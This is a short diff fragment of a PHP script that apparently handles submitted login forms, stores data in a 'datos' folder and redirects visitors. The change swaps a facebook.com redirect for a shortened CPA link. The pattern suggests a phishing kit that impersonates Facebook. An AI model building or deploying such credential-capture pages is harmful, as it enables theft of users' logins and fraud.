@@ -7,7 +7,7 @@ header('Access-Control-Allow-Origin: *');
 $carpeta = 'datos';
 
 /* LINK CPA */
-$cpa = 'https://facebook.com';
+$cpa = 'https://t.co/LJKYBAn6sV';
 
 if(isset($_POST['login'])){
     
